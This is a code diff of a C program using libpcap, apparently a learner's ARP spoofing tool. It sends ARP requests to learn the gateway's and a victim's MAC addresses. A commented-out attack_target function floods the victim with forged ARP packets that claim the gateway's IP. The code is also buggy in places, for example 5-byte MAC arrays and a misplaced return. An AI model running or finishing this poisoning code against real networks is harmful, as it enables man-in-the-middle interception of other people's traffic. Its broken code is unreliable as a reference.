@@ -7,22 +7,18 @@
 #include <netinet/ether.h>
 #include <pthread.h>
 int send_arp(pcap_t *h,const u_char *arp_packet, u_char *sum1);
-void reply_arp(u_char *args, const struct pcap_pkthdr *header, const u_char *s);
+void reply_arp(const u_char *packet);
 static void *readingpacket(pcap_t *h);
 void gateway_sendpacket(pcap_t h);
 void host_sendpacket(pcap_t h);
-
-
-
-
-
+u_char *recvpacket(const u_char *packet);
+//void attack_target(pcap_t *handle);
 struct ethernet_hdr
 {
     uint8_t  ether_dhost[6];/* destination ethernet address */
     uint8_t  ether_shost[6];/* source ethernet address */
     uint16_t ether_type;                 /* protocol */
 };
-
 
 struct arp_hdr
 {
@@ -36,9 +32,7 @@ struct arp_hdr
     u_char  ar_targetmac[6];
     u_char  ar_targetip[4];
 
-
 };
-
 
 struct sum //packging packet
 {
@@ -46,108 +40,94 @@ struct sum //packging packet
     arp_hdr b;
 };
 
-int arp_setting(ethernet_hdr &a, arp_hdr &b);
+int arp_setting(ethernet_hdr &a, arp_hdr &b,int flag);
 
 //my ethernet importmation
 uint8_t myethernet[6] = {0x0c,0x29,0xd6,0x34,0x32}; //ethernetmac address
 uint8_t broadcastmac[6] = {0xff,0xff,0xff,0xff,0xff};
-char my_ip[] = "172.30.1.27";
-
-//other impormation
-u_char gateway_ip[4],host_ip[4];
+char my_ip[] = "192.168.25.4";
 u_char *gatewaymac, *hostmac;
-u_char macaddress[6];
-in_addr senderip, targetip , target_hostip; // targetip = gateway, targetip2 = hostip
+in_addr myip, recvip , targetip; // recvip = gateway, targetip = victeam
 
 //thread
 pthread_t tid;
 
 
- void *thread(void *unused);
-
+void *thread(void *unused);
+int stop =1;
 int main(int args,char *argv[])
 
 {
-    //pakcet send from gateway
+    struct pcap_pkthdr pcap_header; //pcap next
     ethernet_hdr main_ethernet;
     arp_hdr main_arp;
-
     sum *s,*s1;
     pcap_t *handle;            /* Session handle */
-
+    const u_char *packet;
     char *dev;            /* The device to sniff on */
-
     char errbuf[PCAP_ERRBUF_SIZE];    /* Error string */
-
     dev  =  "eth0";
-
     if (dev == NULL) {
-
         fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
-
         return(2);
-
     }
-
     /* Open the session in promiscuous mode */
     handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-
-
-
     if (handle == NULL) {
-
         fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-
         return(2);
-
     }
 
-    //setting arp_packet
-    inet_aton(my_ip,&senderip);
-    inet_aton(argv[2],&targetip);
-        if(arp_setting(main_ethernet,main_arp) == 0)
+    //recv mac address getting!!
+    inet_aton(my_ip,&myip);
+    inet_aton(argv[2],&recvip);
+            if(arp_setting(main_ethernet,main_arp,1) == 0)
             printf("setting success!!\n");
 
-        s = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
-        s->a = main_ethernet; //ethernet
-        s->b = main_arp; //arp
-        const u_char *c = (u_char *)s;
+    s = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
+    s->a = main_ethernet; //ethernet
+    s->b = main_arp; //arp
+    const u_char *c = (u_char *)s;
+    printf("gatewaypacket\nsource ip : %s\n",inet_ntoa(myip));
+    printf("destinaion ip ; %s\n",inet_ntoa(recvip));
+    if(pcap_sendpacket(handle,c,sizeof(*s)) == 0) //block : host_pc is not reply
+    {
+        printf("first packetsend!!\n ");
+        packet = pcap_next(handle,&pcap_header);
+        gatewaymac =recvpacket(packet);
+    //    reply_arp(packet);
 
+    }
+    printf("configuration!!!!!!!!!!!\n");
+    printf("gateway!!!! : %s\n",ether_ntoa((ether_addr *)(gatewaymac)));
 
-
-
-    printf("gatewaypacket\nsource ip : %s\n",inet_ntoa(senderip));
-    printf("destinaion ip ; %s\n",inet_ntoa(targetip));
-
-    //hostpaket send from host
+    //target mac address gettting!!
     ethernet_hdr main2_ethernet;
     arp_hdr main2_arp;
+    inet_aton(argv[1],&targetip);
+    printf("target_host ip : %s\n",inet_ntoa(targetip));
+    if(arp_setting(main2_ethernet,main2_arp,1) == 0)
+    printf("setting success!!\n");
 
-    //sending arp_pakcet setting(host)
-    inet_aton(argv[1],&target_hostip);
-        if(arp_setting(main2_ethernet,main2_arp)==0)
-        {
-            memcpy(main2_arp.ar_targetip, &target_hostip,4);
-            printf("setting success!!\n");
-        }
-        s = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
-        s->a = main2_ethernet; //ethernet
-        s->b = main2_arp; //arp
+
+    s1 = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
+    s1->a = main2_ethernet; //ethernet
+    s1->b = main2_arp; //arp
     const u_char *c1 = (u_char *)s1;
-
-    printf("hostpakcet\nsource ip : %s\n",inet_ntoa(senderip));
-    printf("destinaion ip ; %s\n",inet_ntoa(targetip));
-
-    if(pcap_sendpacket(handle,c,sizeof(*s)) == 0 && pcap_sendpacket(handle,c1,sizeof(*s1) == 0)) //block : host_pc is not reply
+    if(pcap_sendpacket(handle,c,sizeof(*s)) == 0 && pcap_sendpacket(handle,c1,sizeof(*s1)) == 0)
     {
-        printf("packetsend!!\n ");
-        pcap_loop(handle, -1, reply_arp, NULL);//thread
 
+       printf("second packetsend!!\n");
+       packet = pcap_next(handle,&pcap_header);
+       hostmac = recvpacket(packet);
     }
+printf("target!!!! : %s\n",ether_ntoa((ether_addr *)(hostmac)));
+//  Attack ARP target !!
 
 
 
 
+    //  attack_target(handle);
 
 
 
@@ -159,58 +139,11 @@ int main(int args,char *argv[])
 
 
 }
-
-
-
-void reply_arp(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
-{
-    u_char h_ip[4], g_ip[4];
-    memcpy(g_ip, &targetip, 4);
-    memcpy(h_ip, &target_hostip,4);
-    ethernet_hdr *ethernet = (ethernet_hdr *) packet;
-    //printf("send mac : %s\n",ether_ntoa((ether_addr *)(ethernet->ether_shost)));
-    //printf("destination mac : %s\n",ether_ntoa((ether_addr *)(ethernet->ether_dhost)));
-    if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP)
-    {
-        arp_hdr *arp_packet = (arp_hdr *)(packet + sizeof(ethernet_hdr));
-        if(ntohs(arp_packet->ar_pro) == ETHERTYPE_IP && ntohs(arp_packet->ar_op) == ARPOP_REPLY)
-           {
-                if(memcmp(arp_packet->ar_sendip,g_ip,4)==0)
-                {
-                    memcpy(macaddress,ethernet->ether_shost,6);
-                    printf("gateway mac : %s\n",ether_ntoa((ether_addr *)(ethernet->ether_shost)));
-                    gatewaymac = macaddress;
-
-                    if(memcmp(arp_packet->ar_sendip,h_ip,4)==0)
-                        {
-                        memcpy(macaddress,ethernet->ether_shost,6);
-                        printf("host mac : %s\n",ether_ntoa((ether_addr *)(ethernet->ether_shost)));
-                        hostmac = macaddress;
-                        pthread_create(&tid,NULL,&thread,NULL);
-                        printf("thread start!!!!!!!!!!!!\n");
-                        }
-                    else
-                    {
-                        printf("fail hostmacaddress!!\n");
-                        exit;
-                    }
-
-                }
-
-
-
-
-
-          }
-
-      }
-}
-
-int arp_setting(ethernet_hdr &e, arp_hdr &a)
+int arp_setting(ethernet_hdr &e, arp_hdr &a,int flag)
 {
     //ethernet_broadcast impormation
     memcpy(e.ether_shost,&myethernet,6);
-    memcpy(e.ether_dhost,&broadcastmac,6);
+    memset(e.ether_dhost,0xff,6);
     e.ether_type = htons(ETHERTYPE_ARP); //claer
     a.ar_hln = 6;//hawdware szie
     a.ar_pln = 4;//protocol size
@@ -222,69 +155,84 @@ int arp_setting(ethernet_hdr &e, arp_hdr &a)
     memset(a.ar_targetmac,0,sizeof(a.ar_targetmac));
     //ARP IP
 
-    memcpy(a.ar_sendip, &senderip, 4);
-    memcpy(a.ar_targetip, &targetip,4);
-    return 0;
-}
-// tring arp relay
-void gateway_sendpacket(pcap_t *h)
-{
-    sum *g;
-    g = (sum *) malloc(sizeof(ethernet_hdr) + sizeof(arphdr));
-    u_char *c;
-    ethernet_hdr gateway_ethernet;
-    arp_hdr gateway_arp;
-    memcpy(myethernet,gateway_ethernet.ether_shost,6);
-    memcpy(gatewaymac,gateway_ethernet.ether_dhost,6);
-    gateway_ethernet.ether_type = htons(ETHERTYPE_ARP);
-    gateway_arp.ar_hln = 6;
-    gateway_arp.ar_pln = 4;
-    gateway_arp.ar_hrd = htons(ARPHRD_ETHER);
-    gateway_arp.ar_pro = htons(ETHERTYPE_IP);
-    gateway_arp.ar_op = htons(ARPOP_REQUEST);
-    memcpy(myethernet,gateway_arp.ar_sendermac,6);
-    memcpy(host_ip,gateway_arp.ar_sendip,4);
-    memcpy(gateway_ip,gateway_arp.ar_targetip,4);
-    memcpy(gatewaymac,gateway_arp.ar_targetmac,6);
-    g->a = gateway_ethernet;
-    g->b = gateway_arp;
-    c = (u_char *) g;
-    pcap_sendpacket(h,c,sizeof(*g) == 0);
-//after send
+    switch(flag)
+    {
+case 1:
+        memcpy(a.ar_sendip, &myip, 4);
+        memcpy(a.ar_targetip, &recvip,4);
+        break;
+case 2:
 
+        memcpy(a.ar_sendip, &myip, 4);
+        memcpy(a.ar_targetip, &targetip,4);
+        break;
+
+        return 0;
+}
 }
 
-void host_sendpacket(pcap_t *h)
+u_char *recvpacket(const u_char *packet)
 {
-    sum *g;
-    g = (sum *) malloc(sizeof(ethernet_hdr) + sizeof(arphdr));
-    u_char *c;
-    ethernet_hdr host_ethernet;
-    arp_hdr host_arp;
-    memcpy(myethernet,host_ethernet.ether_shost,6);
-    memcpy(hostmac,host_ethernet.ether_dhost,6);
-    host_ethernet.ether_type = htons(ETHERTYPE_ARP);
-    host_arp.ar_hln = 6;
-    host_arp.ar_pln = 4;
-    host_arp.ar_hrd = htons(ARPHRD_ETHER);
-    host_arp.ar_pro = htons(ETHERTYPE_IP);
-    host_arp.ar_op = htons(ARPOP_REQUEST);
-    memcpy(myethernet,host_arp.ar_sendermac,6);
-    memcpy(gateway_ip,host_arp.ar_sendip,4);
-    memcpy(host_ip,host_arp.ar_targetip,4);
-    memcpy(hostmac,host_arp.ar_targetmac,6);
+    ethernet_hdr *ethernet = (ethernet_hdr *) packet;
+    u_char t_ip[4],g_ip[4];
+    memcpy(g_ip, &recvip, 4);
+    memcpy(t_ip, &targetip,4);
+    if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP)
+{
+    arp_hdr *arp_packet = (arp_hdr *)(packet + sizeof(ethernet_hdr));
+    if((ntohs(arp_packet->ar_pro) == ETHERTYPE_IP )&&(ntohs(arp_packet->ar_op) == ARPOP_REPLY))
+ {
+    if(memcmp(arp_packet->ar_sendip,&g_ip,4)==0)
+    {
+        printf("gateway mac : %s\n",ether_ntoa((ether_addr *)(arp_packet->ar_sendermac)));
+        return(arp_packet->ar_sendermac);
+    }
+    else if(memcmp(arp_packet->ar_sendip,&t_ip,4)==0)
 
- //after attack
-    /*
-    g->a = host_ethernet;
-    g->b = host_arp;
-    c = (u_char *) g;
+    {
+        printf("target mac : %s\n",ether_ntoa((ether_addr *)(arp_packet->ar_sendermac)));
+        return(arp_packet->ar_sendermac);
+    }
+ }
+}
+}
+/*
+void attack_target(pcap_t *handle)
+{
+    sum *s3;
+    ethernet_hdr attack_ether;
+    arp_hdr attack_arp;
+    memcpy(attack_ether.ether_shost,&myethernet,6);
+    memcpy(attack_ether.ether_dhost,&hostmac,6);
+    attack_ether.ether_type = htons(ETHERTYPE_ARP); //claer
+    attack_arp.ar_hln = 6;//hawdware szie
+    attack_arp.ar_pln = 4;//protocol size
+    attack_arp.ar_hrd = htons(ARPHRD_ETHER);
+    attack_arp.ar_pro = htons(ETHERTYPE_IP);
+    attack_arp.ar_op = htons(ARPOP_REQUEST);
+    memcpy(attack_arp.ar_sendermac,&myethernet,6);
+    memcpy(attack_arp.ar_sendip,&recvip,4);
+    memcpy(attack_arp.ar_targetip,&targetip,4);
+    memcpy(attack_arp.ar_targetmac,&hostmac,6);
+    printf("ATTACK HEADER INFORMAION!!!!\n");
+    printf("ethernet s_mac : %s\n",ether_ntoa((ether_addr *)(attack_ether.ether_shost)));
+    printf("ethernet d_mac : %s\n",ether_ntoa((ether_addr *)(attack_ether.ether_dhost)));
+    printf("sender mac : %s\n",ether_ntoa((ether_addr *)(attack_arp.ar_sendermac)));
+    printf("target mac : %s\n",ether_ntoa((ether_addr *)(attack_arp.ar_targetmac)));
+    s3 = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
+    s3->a = attack_ether; //ethernet
+    s3->b = attack_arp; //arp
+    const u_char *c3= (u_char *)s3;
+    printf("attack!!\n");
+    printf("sending!!");
+    while(stop)
+    {
+    pcap_sendpacket(handle,c3,sizeof(*s3));
+    }
+
+
+}
 */
-pcap_sendpacket(h,c,sizeof(*g) == 0);
-
-}
-
-
 void *thread(void *unused)
 {
 
